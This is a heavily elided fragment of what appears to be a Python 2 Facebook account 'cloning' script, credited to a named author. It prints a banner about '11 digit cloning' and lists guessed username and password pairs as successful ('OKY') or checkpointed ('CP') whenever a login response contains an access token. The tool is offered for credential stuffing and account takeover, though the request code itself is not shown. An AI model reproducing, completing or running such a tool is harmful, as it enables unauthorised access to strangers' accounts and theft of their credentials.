...
psb('\x1b[1;32mBANGLADESH RAKIB 11 DIGIT CLONING START PLEASE WAIT ..........')
...
def menu():
    ...
    print 'AUTHOR   : RAKIB HASAN'

    print 'FACEBOOK : Rakib Hasan'

    print 'GITHUB     : github.com/RakibxError'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[RAKIB💘NAFIZA-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;93m[RAKIB💘NAFIZA-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
